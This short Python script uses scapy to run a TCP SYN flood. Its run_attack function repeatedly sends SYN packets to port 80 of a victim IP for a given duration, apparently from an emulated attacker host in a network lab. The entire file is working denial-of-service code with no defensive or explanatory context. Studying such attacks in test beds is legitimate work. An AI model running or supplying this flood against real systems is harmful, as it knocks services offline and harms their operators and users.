from scapy.all import Ether, IP, TCP, sendp
import time

def run_attack(attacker_host, victim_ip, duration):
    print(f"Starting SYN Flood from {attacker_host.name} to {victim_ip} for {duration} seconds.")
    start_time = time.time()
    while time.time() - start_time < duration:
        # Craft SYN packet
        packet = Ether()/IP(dst=victim_ip)/TCP(dport=80, flags='S')
        attacker_host.sendp(packet)
    print(f"SYN Flood from {attacker_host.name} to {victim_ip} finished.")